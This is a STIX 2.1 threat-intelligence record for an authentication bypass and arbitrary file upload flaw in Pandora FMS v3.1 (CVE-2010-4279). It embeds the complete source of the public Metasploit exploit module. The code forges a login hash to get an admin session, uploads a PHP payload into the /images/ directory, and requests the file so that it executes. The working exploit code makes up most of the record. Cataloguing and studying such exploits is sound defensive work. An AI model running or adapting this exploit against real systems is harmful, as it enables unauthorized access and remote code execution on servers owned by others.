{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b8dc0c0-1332-4e1c-b512-79bd34a1c028",
    "created": "2024-08-14T17:11:42.837277Z",
    "modified": "2024-08-14T17:11:42.837281Z",
    "name": "\"Pandora FMS v3.1 Auth Bypass and Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits an authentication bypass vulnerability in Pandora FMS v3.1 as disclosed by Juan Galiana Lara. It also integrates with the built-in pandora upload which allows a user to upload arbitrary files to the '/images/' directory.  This module was created as an exercise in the Metasploit Mastery Class at Blackhat that was facilitated by egypt and mubix.   'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/pandora_upload_exec.rb",
            "external_id": "pandora_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4279"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Pandora FMS v3.1 Auth Bypass and Arbitrary File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits an authentication bypass vulnerability in Pandora FMS v3.1 as\n        disclosed by Juan Galiana Lara. It also integrates with the built-in pandora\n        upload which allows a user to upload arbitrary files to the '/images/' directory.\n\n        This module was created as an exercise in the Metasploit Mastery Class at Blackhat\n        that was facilitated by egypt and mubix.\n\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Juan Galiana Lara',                         # Vulnerability discovery\n          'Raymond Nunez <rcnunez[at]upd.edu.ph>',     # Metasploit module\n          'Elizabeth Loyola <ecloyola[at]upd.edu.ph>', # Metasploit module\n          'Fr330wn4g3 <Fr330wn4g3[at]gmail.com>',      # Metasploit module\n          '_flood <freshbones[at]gmail.com>',          # Metasploit module\n          'mubix <mubix[at]room362.com>',              # Auth bypass and file upload\n          'egypt <egypt[at]metasploit.com>',           # Auth bypass and file upload\n        ],\n      'References'     =>\n        [\n          ['CVE', '2010-4279'],\n          ['OSVDB',   '69549'],\n          ['BID',   '45112']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-11-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/pandora_console/']),\n      ])\n  end\n\n  def check\n\n    base  = target_uri.path\n\n    # retrieve software version from login page\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(base, 'index.php')\n      })\n      if res and res.code == 200\n        #Tested on v3.1 Build PC100609 and PC100608\n        if res.body.include?(\"v3.1 Build PC10060\")\n          return Exploit::CheckCode::Appears\n        elsif res.body.include?(\"Pandora\")\n          return Exploit::CheckCode::Detected\n        end\n      end\n      return Exploit::CheckCode::Safe\n    rescue ::Rex::ConnectionError\n      vprint_error(\"Connection failed\")\n    end\n    return Exploit::CheckCode::Unknown\n\n  end\n\n  # upload a payload using the pandora built-in file upload\n  def upload(base, file, cookies)\n    data = Rex::MIME::Message.new\n    data.add_part(file, 'application/octet-stream', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{@fname}\\\"\")\n    data.add_part(\"Go\", nil, nil, 'form-data; name=\"go\"')\n    data.add_part(\"images\", nil, nil, 'form-data; name=\"directory\"')\n    data.add_part(\"1\", nil, nil, 'form-data; name=\"upload_file\"')\n    data_post = data.to_s\n    data_post = data_post.gsub(/^\\r\\n\\-\\-\\_Part\\_/, '--_Part_')\n\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(base, 'index.php'),\n      'cookie'  => cookies,\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'vars_get' => {\n        'sec'  => 'gsetup',\n        'sec2' => 'godmode/setup/file_manager',\n      },\n      'data'    => data_post\n    })\n\n    register_files_for_cleanup(@fname)\n    return res\n  end\n\n  def exploit\n\n    base   = target_uri.path\n    @fname = \"#{rand_text_numeric(7)}.php\"\n    cookies = \"\"\n\n    # bypass authentication and get session cookie\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => normalize_uri(base, 'index.php'),\n      'vars_get' => {\n        'loginhash_data'  => '21232f297a57a5a743894a0e4a801fc3',\n        'loginhash_user' => 'admin',\n        'loginhash' => '1',\n      },\n    })\n\n    # fix if logic\n    if res and res.code == 200\n      if res.body.include?(\"Logout\")\n        cookies = res.get_cookies\n        print_good(\"Login Bypass Successful\")\n        print_status(\"cookie monster = \" + cookies)\n      else\n        fail_with(Failure::NotVulnerable, \"Login Bypass Failed\")\n      end\n    end\n\n    # upload PHP payload to images/[fname]\n    print_status(\"Uploading PHP payload (#{payload.encoded.length} bytes)\")\n    php    = %Q|<?php #{payload.encoded} ?>|\n    begin\n      res = upload(base, php, cookies)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    if res and res.code == 200\n      print_good(\"File uploaded successfully\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Uploading PHP payload failed\")\n    end\n\n    # retrieve and execute PHP payload\n    print_status(\"Executing payload (images/#{@fname})\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(base, 'images', \"#{@fname}\")\n      }, 1)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-30",
    "x_mitre_platforms": [
        "php'"
    ]
}